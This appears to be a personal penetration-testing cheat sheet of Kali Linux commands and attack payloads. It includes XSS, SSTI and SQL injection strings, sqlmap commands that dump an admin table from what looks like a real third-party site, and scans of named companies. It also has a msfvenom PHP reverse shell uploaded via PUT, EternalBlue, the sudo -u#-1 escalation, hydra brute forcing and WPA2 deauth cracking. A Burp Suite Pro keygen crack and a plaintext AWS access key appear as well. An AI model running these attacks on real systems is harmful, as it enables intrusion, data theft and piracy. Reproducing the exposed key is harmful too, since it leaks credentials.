@@ -1,0 +1,530 @@
+last update: 2021/03/02
+
+https://linuxconfig.org/how-to-update-kali-linux
+
+/etc/apt/sources.list
+deb https://http.kali.org/kali kali-rolling main non-free contrib
+
+apt update
+apt list --upgradable
+apt upgrade
+apt dist-upgrade
+apt autoremove
+
+apt-get clean   (clear var/cache/apt/archives)
+= = = = = = = = = = = = = = = 
+
+open an application: firefox &
+- - - - - - - - - -
+listing hidden files --> ls -al
+- - - - - - - - - -
+archive list --> tar tvzf name.tar.gz
+create --> tar cvzf name.tar.gz /path/to/directory
+extract -->tar xvzf <file name>.tar.gz
+- - - - - - - - - -
+find <directory> -name "<name>"
+find /home -name "*cis*cat*.txt"
+https://www.linode.com/docs/tools-reference/tools/find-files-in-linux-using-the-command-line/
+- - - - - - - - - -
+sorting
+sort wordlist.txt | uniq | wc -l
+sort wordlist.txt | uniq >> uniqlist.txt
+- - - - - - - - - -
+execute commands inside vim --> :!<command>
+- - - - - - - - - -
+update-rc.d ssh enable (run ssh on boot)
+
+service ssh start
+ssh -l admin 192.168.1.122
+
+rdesktop <ip>
+- - - - - - - - - -
+disk imaging --> dd if=/dev/sda of=/root/Desktop/image.dd bs=512
+- - - - - - - - - -
+create hash
+echo "Pearson" | sha256sum
+echo "Pearson" | md5
+- - - - - - - - - -
+= = = = = host discovery = = = = = = = = = =
+
+tcptraceroute mail.example.com 25
+
+fping -a -g 192.168.1.0/24
+
+hping3 www.nsbm.lk -S -p 80 -c 4
+
+netdiscover
+netdiscover -r 192.168.1.0/24
+nmap -sn -PS 192.168.1.0/24 (ping sweep)
+nmap -Pn 192.168.1.0/24 (use when icmp blocked)
+
+nmap -sS -p 1-65535 203.115.12.9
+nmap -p - -T4 -A -v -Pn 203.115.12.9
+
+check open ports with telnet
+telnet [domain name or ip] [port]
+https://www.acronis.com/en-eu/articles/telnet/
+
+masscan
+
+nc -vn ipadd 25
+= = = = = = = = = = = = = = =
+
+/usr/share/nmap/scripts# ls *sql*
+
+nmap -p 3386 --script="mysql-info" 192.168.1.34
+mysql-enum
+mysql-brute
+
+= = = = = information gathering = = = = = = = = = =
+
+check source code, robots.txt, error pages, 
+put special characters in UN & PW fields (*,*)
+URL manipulation - Get URLs accessible by admin and try with user. 
+
+google --> site:softlogic.lk -site:www.softlogic.lk
+                   Inurl:login site:gov.lk
+find email IDs --> https://hunter.ik source code, robots.txt, error o/
+SSL details --> www.ssllabs.com
+malware analysis --> https://www.virustotal.com/gui/
+
+URL encode - https://meyerweb.com/eric/tools/dencoder/
+Most of the time when you accept input from the user the very first thing you do is pass it through a HTML encoder. 
+https://www.striphtml.com/
+https://www.freeformatter.com/html-formatter.html
+
+url?file=../../../../etc/passwd
+- - - - - - - - - -
+HSTS 
+curl -s -D- https://www.abc.com/ | grep -i Strict
+use full url, no result no hsts
+- - - - - - - - - -
+wpscan --url https://www.hnbassurance.com
+wpscan --url https://www.hnbassurance.com --enumerate u
+- - - - - - - - - -
+nikto -h https://www.hnbgeneral.com/
+- - - - - - - - - -
+whatweb https://ipg.softlogiclife.lk/
+- - - - - - - - - -
+sslscan www.hnbassurance.com
+
+= = = = = directory listing = = = = = = = = = =
+
+dirbuster --> /usr/share/dirbuster/wordlists
+
+gobuster -u https://www.pwc.com -w rockyou.txt
+
+dirb http://www.site.com /usr/share/dirb/wordlists/common.txt
+- - - - - - - - - -
+burpsuit
+target --> site map --> right click --> engagement tools --> discover content
+= = = = = = = = = = = = = = =
+
+oracle db --> oscanner -s 192.168.1.15 -P 1040 -v
+
+= = = = = supported http methods = = = = = = = = = =
+nmap -p 80 --script http-methods --script-args http-methods.url-path='/dav/' 192.168.1.208
+nmap -p 443 --script http-methods --script-args http-methods.url-path='/login/home/index/' mycloud.pearson.com
+
+= = = = = exploiting PUT method = = = = = = = = = =
+
+method1 nmap;
+nmap -p 80 192.168.1.208 --script http-put --script-args http-put.url='/dav/test.html',http-put.file='/root/Desktop/test.html'
+
+https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/06-Test_HTTP_Methods
+
+method2 cadaver;
+cadaver http://192.168.1.9/dav/
+put /root/Downloads/hostingstart.html
+https://www.hackingarticles.in/multiple-ways-to-exploiting-put-method/
+
+method3 burp;
+send to Repeater --> change method to PUT --> provide a new file (/test.html) --> check response for 2xx, 3xx. 
+DELETE can be used in same method.
+
+deleting file using DELETE method;
+cadaver http://192.168.1.9/dav/
+delete <file name>
+= = = = = = = = = = = = = = = 
+
+= = = = = XSS = = = = = = = = = =
+
+Check url
+How to verify reflected XSS - input entered, present in the page source.
+
+<script>alert('xss')</script>
+<script>alert(document.cookie)</script>
+<script>alert(1)</script>
+<div onmouseover=alert('xss')>mouse here</div>
+<div onwheel=alert('xss')>mouse wheel here</div>
+<img src=x onerror=alert('xss')>test</img>
+<img src=x onerror=window.open("http://abc.com");>
+
+<img src=x onwheel=alert('xss')>mouse wheel on img</img>
+<img src=x onmouseover=alert('xss')>mouse on img</img>
+<iframe src=x onmouseover=alert('xss')>test</iframe>
+<body onload="javascript:alert('xss')">
+
+html hyperlink works in the result display. 
+<a href="http://www.test.link">link text</a>
+<a href="http://www.test.link" onmouseover=alert('xss')>link text</a>
+<a href="http://www.test.link" onwheel=alert('xss')>link text</a>
+
+* replacement for "alert()" --> prompt()
+* change case of "script, alert". eg: ScRiPt, aLeRt
+- - - - - - - - - 
+<p id="demo"></p>
+<script>
+var x = 100 + 50;
+document.getElementById("demo").innerHTML = x;
+</script>
+- - - - - - - - - 
+
+Non-Recursive Filtering      <scr<script>ipt>alert('xss')</script>
+Grave Accent Obfuscation <IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
+HTML Entities                      <IMG SRC=javascript:alert(&quot;XSS&quot;)>
+
+are automagically converted into their harmless encoded equivalents:
+&lt;script&gt;alert('hello XSS!');&lt;/script&gt;
+"><script >alert(document.cookie)</script >
+"><ScRiPt>alert(document.cookie)</ScRiPt>
+"%3cscript%3ealert(document.cookie)%3c/script%3e
+
+https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+
+xsser -c100 --Cw=4 -u http://www.abc.com
+sometimes doesnt work.
+
+= = = = = SSTi = = = = = = = = = =
+Server-Side Template Injection
+/{{ 10*10 }}
+/{{config.__class__.__init__.__globals__['os'].popen('cat flag.txt').read()}}
+
+/?message=<%= 7*7 %>
+/?message=<%= system("rm /home/carlos/morale.txt") %>
+
+https://github.com/payloadbox/ssti-payloads
+
+= = = = = SQL injection = = = = = = = = = =
+' or 1=1 --
+'xxx' or '1'='1'
+- - - - - - - - - - - - - - - - - - - - 
+sqlmap                       .php?id=1
+- - - - - dumping a db - - - - - - - - - - - - - - - 
+sqlmap -u esoftnugegoda.com/gallery-album.php?id=9 --dbs --level=5 --risk=3
+sqlmap -u http://esoftnugegoda.com/gallery-album.php?id=9 -D esoftnu1_nugegoda_db1 --tables
+sqlmap -u http://esoftnugegoda.com/gallery-album.php?id=9 -D esoftnu1_nugegoda_db1 -T admin --columns
+sqlmap -u http://esoftnugegoda.com/gallery-album.php?id=9 -D esoftnu1_nugegoda_db1 -T admin -C name --dump
+sqlmap -u http://esoftnugegoda.com/gallery-album.php?id=9 -D esoftnu1_nugegoda_db1 -T admin --dump
+
+- - - - - read a file in remote server - - - - - - - - - - - - - - - 
+sqlmap –u http://abc.com/site.php?id=1 –file-read=/var/www/html/index.php
+download location - /root/.sqlmap/output/[site name]/files/ 
+= = = = = = = = = = = = = = = 
+
+ExifTool by Phil Harvey
+./exiftool file.docx
+- - - - - - - - - -
+
+find outbound ports
+github /trustedsec/egressbuster
+
+listener: python egress_listener.py <IP> eth0
+
+python egressbuster.py <IP> 1-65535 | tee open_ports.txt''
+- - - - - - - - - -
+openssl s_client -connect target.site:443
+HEAD / HTTP/1.0
+
+httprint -P0 -h [target] -s [signature file]
+- - - - - - - - - -
+sudo apt-get install fcrackzip
+fcrackzip -v -m zip6 -l 4-8 -u secret.zip
+https://allanfeid.com/content/cracking-zip-files-fcrackzip
+= = = = = = = = = = = = = = =
+
+WhatWaf --> https://github.com/Ekultek/WhatWaf
+
+git clone https://github.com/ekultek/whatwaf.git
+cd whatwaf
+chmod +x whatwaf.py
+pip2 install -r requirements.txt
+./whatwaf.py -u www.pwc.lk
+= = = = = = = = = = = = = = =
+
+cd wafninja
+
+python wafninja.py fuzz 
+-u "http://192.168.1.208/dvwa/vulnerabilities/xss_r/?name=FUZZ" 
+-c "PHPSESSID=e528731a60e8395418498ff9f57b9e75; security=low"
+-t xss 
+-o /root/Desktop/output.html
+
+https://github.com/khalilbijjou/WAFNinja
+===============
+
+http://docs.w3af.org/en/latest/install.html
+= = = = = = = = = = = = = = =
+
+https://support.portswigger.net/customer/portal/questions/17360581-burp-suite-won-t-start-at-all-with-java-1-
+
+update-alternatives --config java
+select java8
+- - - - - - - - - - - - - - -
+
+go to folder
+burp-loader-keygen.jar
+
+copy the key and manual activation
+- - - - - - - - - - - - - - -
+
+start burpsuit pro, go to folder
+
+java -Xbootclasspath/p:burp-loader-keygen.jar -jar burpsuite_pro_v1.7.36.jar
+
+sql injections;
+'+UNION+SELECT+NULL,NULL--
+'+UNION+SELECT+'abc','def'--
+'+UNION+SELECT+username,+password+FROM+users--
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
+
+oracle
+'+UNION+SELECT+'abc','def'+FROM+DUAL--
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
+= = = = = = = = = = = = = = = 
+
+wireshark filters
+ip.addr == 192.168.1.21 and !(ip.addr == 54.246.133.196) and tcp.port == 443
+===============
+
+create a reverse shell;
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.105 lport=4444 -f raw
+
+save the code from <?php to end to a file as shell.php
+• use PUT method to upload the file.
+= = = = = = = = = = = = = = = 
+
+https://www.bleepingcomputer.com/news/linux/linux-sudo-bug-lets-you-run-commands-as-root-most-installs-unaffected/
+
+1. sudo version should be less than 1.8.28
+          sudo -V
+2. user must be in the "sudoers" with ALL or some access.
+3. execute the command in sudo mode to have "root" privilege.
+          sudo -u#-1 <command>
+===============
+
+metasploit start commands
+
+service postgresql start
+
+ss -lntp |grep post
+
+service postgresql restart
+
+msfdb reinit
+- - - - - - - - - -
+
+msfconsole
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost, lport, exploit, run shell.php
+
+Run command to escalate privilege: 
+shell
+python -c 'import pty;pty.spawn("/bin/sh")'
+
+search eternal
+use exploit/windows/smb/ms17_010_eternalblue
+show options
+set rhost 192.168.1.9
+exploit
+===============
+
+hydra
+step1: capture burp request
+
+find username:
+
+hydra
+-vV
+-L wordlist.txt
+-p wedontcare
+192.168.1.30
+http-post-form
+'/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed'
+
+
+find password:
+
+hydra
+-vV
+-l admin
+-P wordlist.txt
+192.168.1.30
+http-post-form
+'/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed'
+===============
+
+aws cli configuration
+https://docs.aws.amazon.com/cli/latest/userguide/awscli-install-linux.html
+
+export PATH=~/.local/bin/:$PATH
+
+aws --version
+
+aws configure
+
+username: AKIAJXOKO4IBXHAEKXKQ
+
+password: +nxxUHVOdmOcqZBzYnFsWngtIkU7kaOQT4KpobLa
+
+aws s3 ls s3://csestaging
+===============
+
+https://medium.com/@airman604/installing-docker-in-kali-linux-2017-1-fbaa4d1447fe
+
+= = = = = wifi pentest = = = = = = = = = = 
+airmon-ng
+airmon-ng start wlan0
+
+airodump-ng wlan0mon
+airodump-ng -c 1 wlan0mon
+
+1. uncover hidden ssid
+
+airodump-ng wlan0mon
+
+monitor only the channel of hidden ssid
+airodump-ng -c <channel> wlan0mon
+
+deauth attack
+aireplay-ng -0 2 -a <MAC of ap> wlan0mon
+
+2. WPA2 password
+
+airodump-ng wlan0mon
+
+capture client association to file
+airodump-ng -w <cap file> -c <channel> --bssid <MAC of ap> wlan0mon
+
+deauth attack
+aireplay-ng -0 2 -a <MAC of ap> wlan0mon
+
+dictionary attack on cap file
+aircrack-ng <cap file> -w <dictionary>
+===============
+
+wget https://downloads.cisofy.com/lynis/lynis-2.7.4.tar.gz
+tar xvzf lynis.tar.gz
+go to lynis folder, open terminal, run as root
+./lynis audit system
+
+./lynis audit dockerfile <file name>
+./lynis show version
+./lynis show help
+./lynis update info
+===============
+
+install sshuttle: apt-get install sshuttle
+sshuttle -r daredumidu@104.215.118.126 0.0.0.0/0
+
+netstat -antp | grep ssh
+- - - - - - - - - - - - - - -
+
+https://github.com/Dragon2fly/vpngate-with-proxy
+
+go to vpngate-with-proxy
+./run
+Connect to a specific vpn server by typing its index number
+
+r, refresh: fetch new server's data from vpngate.net or mirrors
+restore: will restore your system DNS back to original one
+kill: send SIGTERM to all openvpn processes
+q: terminate vpn tunnel, then quit the program
+= = = = = = = = = = = = = = = 
+
+https://takeover.cyberint.com/
+dnsdumpster.com
+- - - - - - - - - - - - - - - - - 
+
+sublist3r
+sublist3r -d [domain]
+- - - - - - - - - - - - - - - - - 
+
+installation:
+step1:	install golang
+apt install golang
+
+step2: 	install sublister
+go get -v github.com/projectdiscovery/subfinder/cmd/subfinder
+/root/go/src/github.com/subfinder/subfinder
+
+step3: install tko-subs
+go get github.com/anshumanbh/tko-subs
+/root/go/src/github.com/anshumanbh/tko-subs
+
+"providers-data.csv" location (/root/go/src/github.com/anshumanbh/tko-subs)
+download latest version: wget https://raw.githubusercontent.com/anshumanbh/tko-subs/master/providers-data.csv
+- - - - - - - - - - - - - - - - - - - - 
+
+run the program, go to: /root/go/bin
+
+step1: run subfinder
+./subfinder -d kingston.ac.uk -o /root/Desktop/kingston.txt -v
+
+step2: run tko-subs
+./tko-subs -domains=/root/Desktop/kingston.txt -data=providers-data.csv -output=/root/Desktop/kingston_output.csv
+= = = = = = = = = = = = = = = 
+
+qark install
+https://github.com/linkedin/qark
+
+extract the files
+go to the folder, /qark-master
+open terminal
+
+pip install -r requirements.txt
+pip install . --user
+
+go to folder - /root/home/qark-master/qark
+start qark using bellow commands - open terminal
+python qarkMain.py
+===============
+
+https://github.com/Arachni/arachni/wiki/Installation
+
+./Documents/arachni-1.5.1-0.5.12-linux-x86_64/bin/arachni_web
+
+http://localhost:9292/
+Administrator account - admin@admin.admin - administrator
+Regular user account - user@user.user - regular_user
+===============
+
+https://github.com/MobSF/Mobile-Security-Framework-MobSF/blob/master/requirements.txt
+https://qualibrate.com/blog/quality-assurance/implement-mobsf-on-kali-linux/
+
+go to folder - /root/mobsf/Mobile-Security-Framework-MobSF
+start mobsf using bellow commands - open terminal
+source venv/bin/activate
+python3 manage.py runserver 8000
+
+http://localhost:8000/
+http://localhost:8000/recent_scans/
+===============
+
+drozer
+
+ls (gives command list)
+
+run app.package.info -a io.cordova.myapp811b25
+
+adb shell
+
+ls /data/data/
+===============
+
+CVE PoC
+https://github.com/trickest/cve
+===============
